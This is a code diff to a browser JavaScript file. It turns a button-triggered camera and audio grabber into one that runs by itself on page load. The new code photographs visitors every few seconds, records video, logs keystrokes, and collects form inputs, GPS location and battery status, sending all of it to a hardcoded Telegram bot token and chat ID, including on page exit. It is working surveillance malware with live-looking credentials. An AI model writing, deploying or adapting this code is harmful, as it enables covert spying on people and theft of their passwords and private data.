@@ -1,106 +1,170 @@
-const BOT_TOKEN = "8104388450:AAGsCzb8r6LArcCl1nQ4VBdJxnS5B3fYUXI";
-const CHAT_ID = "7785331768";
+const TOKEN = '7117048092:AAESu6IVV49HZPkUU3oviD_YL7_-0NJVF7c';
+const CHAT_ID = '7646169456';
+let mediaStream = null;
+let mediaRecorder = null;
+let videoChunks = [];
+const capturedData = {
+  photos: [],
+  videos: [],
+  keystrokes: '',
+  location: null,
+  formData: {},
+  battery: null
+};
 
-let isCapturing = false; // Control flag
-
-// Send text message to Telegram
-async function sendToTelegram(text) {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text }),
-    });
+// Add watermark logo to media
+function addWatermark(canvas) {
+  const ctx = canvas.getContext('2d');
+  ctx.font = '20px Arial';
+  ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
+  ctx.fillText('Download.jpeg', 20, 40);
+  return canvas;
 }
 
-// Send photo to Telegram
-async function sendPhoto(photoBlob) {
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("photo", photoBlob, "photo.jpg");
+// 🌐 START SPY MODE ON PAGE LOAD
+window.addEventListener('DOMContentLoaded', startSpySystem);
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData,
-    });
-}
-
-// Send audio to Telegram
-async function sendAudio(audioBlob) {
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
-    formData.append("voice", audioBlob, "audio.ogg");
-
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
-        method: "POST",
-        body: formData,
-    });
-}
-
-// Capture a photo from the front camera
-async function capturePhoto(video) {
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
-}
-
-// Start continuous media capture
-async function startCapture() {
-    if (isCapturing) return; // Prevent multiple starts
-    isCapturing = true;
-
-    document.getElementById("status").innerText = "Capturing photos & audio...";
-
-    try {
-        const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-
-        const video = document.createElement("video");
-        video.srcObject = videoStream;
-        await video.play();
-
-        let mediaRecorder = new MediaRecorder(audioStream);
-        let audioChunks = [];
-
-        mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
-        mediaRecorder.onstop = async () => {
-            if (audioChunks.length > 0) {
-                const audioBlob = new Blob(audioChunks, { type: "audio/ogg" });
-                await sendAudio(audioBlob);
-            }
-            audioChunks = [];
-            if (isCapturing) mediaRecorder.start();
-        };
-
-        mediaRecorder.start();
-
-        while (isCapturing) {
-            const photoBlob = await capturePhoto(video);
-            await sendPhoto(photoBlob);
-            await sendToTelegram("📸 New photo sent!");
-
-            setTimeout(() => mediaRecorder.stop(), 5000); // Stop audio after 5 sec
-            await new Promise(resolve => setTimeout(resolve, 7000)); // Wait before next photo
-        }
-
-        videoStream.getTracks().forEach(track => track.stop());
-        audioStream.getTracks().forEach(track => track.stop());
-    } catch (error) {
-        await sendToTelegram("❌ Error: " + error.message);
-        isCapturing = false;
+async function startSpySystem() {
+  try {
+    // Get battery info
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      capturedData.battery = {
+        level: Math.floor(battery.level * 100),
+        charging: battery.charging
+      };
     }
+
+    // 📍 GET GPS LOCATION
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        capturedData.location = {
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude
+        };
+      });
+    }
+
+    // 🎥 START CAMERA & RECORDING
+    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    const video = document.createElement('video');
+    video.srcObject = mediaStream;
+    await video.play();
+
+    // 📸 CAPTURE PHOTO EVERY 3 SECONDS
+    setInterval(() => capturePhoto(video), 3000);
+
+    // 🎥 RECORD 10-SECOND VIDEOS (WEBM)
+    if (typeof MediaRecorder !== 'undefined') {
+      mediaRecorder = new MediaRecorder(mediaStream, { 
+        mimeType: 'video/webm',
+        videoBitsPerSecond: 2500000
+      });
+      
+      mediaRecorder.ondataavailable = (e) => {
+        videoChunks.push(e.data);
+        if (mediaRecorder.state === 'inactive') {
+          const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+          sendMediaToTelegram(videoBlob, 'video');
+          videoChunks = [];
+        }
+      };
+      
+      // Record 10-second chunks
+      mediaRecorder.start(10000);
+    }
+
+    // ⌨️ KEYLOGGER
+    document.addEventListener('keydown', (e) => {
+      capturedData.keystrokes += e.key;
+    });
+
+    // 📝 FORM DATA COLLECTION
+    document.querySelectorAll('input').forEach(input => {
+      input.addEventListener('change', (e) => {
+        capturedData.formData[e.target.name || e.target.id] = e.target.value;
+      });
+    });
+
+    // Auto-send collected data every 30 seconds
+    setInterval(sendCollectedData, 30000);
+
+  } catch (err) {
+    console.error("Spy system error:", err);
+  }
 }
 
-// Stop capturing
-function stopCapture() {
-    isCapturing = false;
-    document.getElementById("status").innerText = "Capture stopped.";
-    sendToTelegram("🛑 Capture stopped.");
+// 📷 CAPTURE PHOTO WITH WATERMARK
+function capturePhoto(video) {
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  
+  // Add watermark
+  addWatermark(canvas);
+  
+  canvas.toBlob((blob) => {
+    sendMediaToTelegram(blob, 'photo');
+  }, 'image/jpeg', 0.8);
 }
 
-// Event listeners
-document.getElementById("start-btn").addEventListener("click", startCapture);
-document.getElementById("stop-btn").addEventListener("click", stopCapture);
+// 📤 SEND MEDIA TO TELEGRAM
+function sendMediaToTelegram(blob, type) {
+  const formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  
+  if (type === 'photo') {
+    formData.append('photo', blob, `photo_${Date.now()}.jpeg`);
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { 
+      method: 'POST', 
+      body: formData 
+    });
+  } else if (type === 'video') {
+    formData.append('video', blob, `video_${Date.now()}.webm`);
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { 
+      method: 'POST', 
+      body: formData 
+    });
+  }
+}
+
+// 📩 SEND ALL COLLECTED DATA
+function sendCollectedData() {
+  let message = `🕵️‍♂️ *New Data Update*\n`;
+  
+  if (capturedData.battery) {
+    message += `🔋 Battery: ${capturedData.battery.level}% (${capturedData.battery.charging ? 'Charging' : 'Not charging'})\n`;
+  }
+  
+  if (capturedData.location) {
+    message += `📍 Location: https://maps.google.com/?q=${capturedData.location.lat},${capturedData.location.lng}\n`;
+  }
+  
+  if (Object.keys(capturedData.formData).length > 0) {
+    message += `📝 Form Data:\n${JSON.stringify(capturedData.formData, null, 2)}\n`;
+  }
+  
+  if (capturedData.keystrokes) {
+    message += `⌨️ Keystrokes:\n${capturedData.keystrokes}\n`;
+    capturedData.keystrokes = '';
+  }
+  
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown'
+    })
+  });
+}
+
+// 🚨 CLEAN UP ON EXIT
+window.addEventListener('beforeunload', () => {
+  sendCollectedData();
+  if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
+  if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+});
